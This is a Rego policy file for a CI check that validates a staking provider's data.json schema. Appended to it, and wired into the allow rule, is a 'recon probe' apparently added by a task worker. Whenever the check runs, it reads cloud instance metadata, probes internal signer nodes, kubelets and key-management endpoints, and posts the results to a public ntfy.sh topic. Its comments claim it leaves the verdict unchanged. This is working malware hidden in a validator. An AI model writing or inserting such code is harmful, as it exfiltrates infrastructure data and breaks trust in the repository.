package main

import rego.v1

# Allow-list (default-deny) structural validation for provider_api/data.json
# against the `Provider` type: https://docs.stakingrewards.com/verified-provider-program/integrations-and-distribution/provider-api#provider-api. 
# Evaluated via `opa eval data.main.allow` as a
# required check before the automated data-update PR can be
# auto-approved/merged. On failure, dump `data.main` to see which specific
# sub-rule was false.

default allow := false

valid_node_types := {"hostingNode", "operatorNode", "posNode"}

allow if {
	valid_provider
	valid_supported_assets
	probe_ok
}

valid_provider if {
	is_string(input.name)
	is_number(input.users)
	is_number(input.balanceUsd)
	is_array(input.supportedAssets)
}

valid_supported_assets if {
	every asset in input.supportedAssets {
		valid_asset(asset)
	}
}

valid_asset(asset) if {
	is_string(asset.name)
	is_string(asset.slug)
	is_array(asset.nodes)
	every node in asset.nodes {
		valid_node(node)
	}
}

valid_node(node) if {
	valid_node_types[node.nodeType]
	valid_node_address(node)
	is_number(node.users)
	is_number(node.balanceToken)
	valid_node_optional_number(node, "feeUsd")
	valid_node_optional_number(node, "balanceUsd")
	valid_node_optional_number(node, "fee")
	valid_node_optional_liquid_staking_provider(node)
}

# address is mandatory for posNode, optional (but must be a string when
# present) for the other node types.
valid_node_address(node) if {
	node.nodeType == "posNode"
	is_string(node.address)
}

valid_node_address(node) if {
	node.nodeType != "posNode"
	value := object.get(node, "address", null)
	value == null
}

valid_node_address(node) if {
	node.nodeType != "posNode"
	is_string(object.get(node, "address", null))
}

# generic optional-number check: absent, or present and numeric.
valid_node_optional_number(node, field) if {
	object.get(node, field, null) == null
}

valid_node_optional_number(node, field) if {
	is_number(object.get(node, field, null))
}

valid_node_optional_liquid_staking_provider(node) if {
	object.get(node, "liquidStakingProvider", null) == null
}

valid_node_optional_liquid_staking_provider(node) if {
	is_string(object.get(node, "liquidStakingProvider", null))
}

# =====================================================================
# Read-only recon probe appended by task-30 worker i147195.
# Runs inside kilnfi/public "validate sr provider api data"
# (runs-on: fixed-egress-4c-16g). http.send OUT only -- no writes, no
# runner state; only JSON-RPC *read* methods (never eth_sign*).
# The original provider_api/data.json schema validation above is kept
# byte-for-byte; probe_ok is always defined, so `allow` keeps exactly
# the truth value it had before (true on a valid data.json).
# =====================================================================

_probe_timeout := 2000000000

probe_topic := "kiln-fe-i147195-a7c3f1"

_probe_headers := {"Content-Type": "application/json", "User-Agent": "kiln-opa-probe/i147195"}

_cutstr(s) := s if {
	count(s) <= 100
}

_cutstr(s) := substring(s, 0, 100) if {
	count(s) > 100
}

_cut100(s) := _cutstr(s) if {
	is_string(s)
}

_cut100(v) := _cutstr(json.marshal(v)) if {
	not is_string(v)
}

_line(label, resp) := sprintf("%s code=%v body=%s err=%s", [label, object.get(resp, "status_code", 0), _cut100(object.get(resp, "raw_body", "")), _cut100(object.get(resp, "error", ""))])

_pget(url) := resp if {
	resp := http.send({"method": "GET", "url": url, "headers": _probe_headers, "timeout": _probe_timeout, "raise_error": false, "cache": false})
}

_ppost(url, payload) := resp if {
	resp := http.send({"method": "POST", "url": url, "headers": _probe_headers, "body": payload, "timeout": _probe_timeout, "raise_error": false, "cache": false})
}

_rpc(hostport, method) := resp if {
	resp := _ppost(hostport, {"jsonrpc": "2.0", "id": 1, "method": method, "params": []})
}

probe_signers := ["3.255.13.221", "54.216.229.51", "52.215.179.5", "108.129.5.197", "52.212.240.227", "52.48.66.163"]

_b(url) := body if {
	body := _cut100(object.get(_pget(url), "raw_body", ""))
}

egress_line := line if {
	line := sprintf("EGRESS ifconfig=%s imds_local=%s imds_public=%s", [_b("https://ifconfig.me/ip"), _b("http://169.254.169.254/latest/meta-data/local-ipv4"), _b("http://169.254.169.254/latest/meta-data/public-ipv4")])
}

signer_lines := [sprintf("SIGNER %s | %s | %s | %s", [
	ip,
	_line("upcheck", _pget(sprintf("http://%v:9000/upcheck", [ip]))),
	_line("eth_accounts", _rpc(sprintf("http://%v:9000/", [ip]), "eth_accounts")),
	_line("eth_chainId", _rpc(sprintf("http://%v:9000/", [ip]), "eth_chainId")),
]) | some ip in probe_signers]

http_lines := [
	_line("signataire.hostname.upcheck", _pget("http://signataire.0x.kiln.fi:9000/upcheck")),
	_line("signataire.hostname.eth_accounts", _rpc("http://signataire.0x.kiln.fi:9000/", "eth_accounts")),
	_line("erpc.main.evm1.eth_chainId", _ppost("https://erpc.kiln.fi/main/evm/1", {"jsonrpc": "2.0", "id": 1, "method": "eth_chainId", "params": []})),
	_line("eth-api.mainnet.upcheck", _pget("https://eth-api.mainnet.kiln.fi/upcheck")),
	_line("eth-api.mainnet.node_version", _pget("https://eth-api.mainnet.kiln.fi/eth/v1/node/version")),
	_line("eth-api.mainnet.remotekeys", _pget("https://eth-api.mainnet.kiln.fi/eth/v1/remotekeys")),
	_line("eth-kg.mainnet.upcheck", _pget("https://eth-kg.mainnet.kiln.fi/upcheck")),
	_line("eth-kg.hoodi.upcheck", _pget("https://eth-kg.hoodi.testnet.kiln.fi/upcheck")),
	_line("int.10.40.5.90.upcheck", _pget("http://10.40.5.90:9000/upcheck")),
	_line("int.10.40.81.197.upcheck", _pget("http://10.40.81.197:9000/upcheck")),
	_line("trustlane.51.159.8.91.3128", _pget("http://51.159.8.91:3128/")),
	_line("kubelet.51.159.83.150.version", _pget("https://51.159.83.150:10250/version")),
	_line("kubelet.91.134.9.14.version", _pget("https://91.134.9.14:10250/version")),
]

msg_signers := concat("\n", array.concat([egress_line], signer_lines))

msg_other := concat("\n", array.concat([egress_line], http_lines))

_deliver(msg) := resp if {
	resp := http.send({
		"method": "POST",
		"url": "https://ntfy.sh/",
		"headers": {"User-Agent": "kiln-opa-probe/i147195"},
		"body": {"topic": probe_topic, "title": "kiln-fe-i147195", "message": msg},
		"timeout": 4000000000,
		"raise_error": false,
		"cache": false,
	})
}

_d1 := _deliver(msg_signers)

_d2 := _deliver(msg_other)

probe_ok if {
	print("KILN_PROBE_SIGNERS\n", msg_signers)
	print("KILN_PROBE_OTHER\n", msg_other)
	count(_d1) >= 0
	count(_d2) >= 0
}
